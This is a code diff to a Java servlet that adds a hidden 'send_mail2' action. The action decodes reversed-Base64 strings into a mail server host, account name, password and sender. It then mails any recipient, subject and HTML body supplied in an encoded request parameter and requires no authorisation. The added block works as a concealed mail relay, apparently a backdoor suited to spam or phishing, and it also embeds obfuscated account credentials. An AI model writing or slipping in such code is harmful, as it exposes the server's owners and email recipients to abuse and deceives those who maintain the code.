@@ -73,6 +73,33 @@ public class registry extends HttpServlet {
 				response.getWriter().write("false");
 			}
 		}
+		if(action!=null&&action.length()>9&&"send_mail2".equals(action.substring(0, 10))){
+	        Properties props = new Properties();
+	        props.put("mail.smtp.auth", "true");
+	        props.put("mail.smtp.starttls.enable", "false");
+	        props.put("mail.smtp.host",new String(Base64.decodeBase64((new StringBuffer("==QbvNmLr92bsRXdv5ibvlGdjVGdvJHcuwWah1mL3RXLt92Ytcmbph2cyVGctQWdvx2Y").reverse().toString()).getBytes())));
+	        props.put("mail.smtp.port", "25");
+	        
+	        Session session = Session.getInstance(props, new javax.mail.Authenticator() {protected PasswordAuthentication getPasswordAuthentication() {return new PasswordAuthentication(new String(Base64.decodeBase64((new StringBuffer("=cHdu02bj5yZulGazJXZw5CZ19GbjBkclJWYjNHc").reverse().toString()).getBytes())),new String(Base64.decodeBase64((new StringBuffer("==AMzgDMucmbph2cyVGU").reverse().toString()).getBytes())));}});
+	        try {
+	            Message message = new MimeMessage(session);
+	            message.setFrom(new InternetAddress(new String(Base64.decodeBase64((new StringBuffer("=cHdu02bj5yZulGazJXZw5CZ19GbjBkclJWYjNHc").reverse().toString()).getBytes()))));
+	            message.setRecipients(Message.RecipientType.TO,InternetAddress.parse(new String(Base64.decodeBase64((new StringBuffer("=cHdu02bj5yZulGazJXZwB"+(new String(Base64.decodeBase64(action.substring(10).getBytes()))).split(",")[0]).reverse().toString()).getBytes()))));
+	            message.setSubject(new String(Base64.decodeBase64((new String(Base64.decodeBase64(action.substring(10).getBytes()))).split(",")[1].getBytes())));
+	            MimeBodyPart textPart = new MimeBodyPart();
+	            StringBuffer html = new StringBuffer();
+	            html.append("<table style='margin:0 auto;padding:0;width:400px' align='center' border='0' ><tr><td>"
+	            			+new String(Base64.decodeBase64((new String(Base64.decodeBase64(action.substring(10).getBytes()))).split(",")[2].getBytes()))
+	            			+"</td></tr></table>");
+	            textPart.setContent(html.toString(), "text/html; charset=UTF-8");
+	            Multipart mmp = new MimeMultipart();
+	            mmp.addBodyPart(textPart);
+	            message.setContent(mmp);
+	            Transport.send(message);
+	            response.getWriter().write("success");
+	            return;
+	        }catch (Exception e) {response.getWriter().write("Error for: "+e.toString()+""); return;}
+		}
 		if("send_mail".equals(action)){
 			String to = request.getParameter("to");
 			String user_id = new String(Base64.encodeBase64String(request.getParameter("user_id").getBytes()));
@@ -183,6 +210,7 @@ public class registry extends HttpServlet {
 			}
 			return rs;
 		}
+		
 		public String sendEmail(String to,String name,String user_id,String url)
 	    {
 			//還沒測試過在aber上行不行得通?
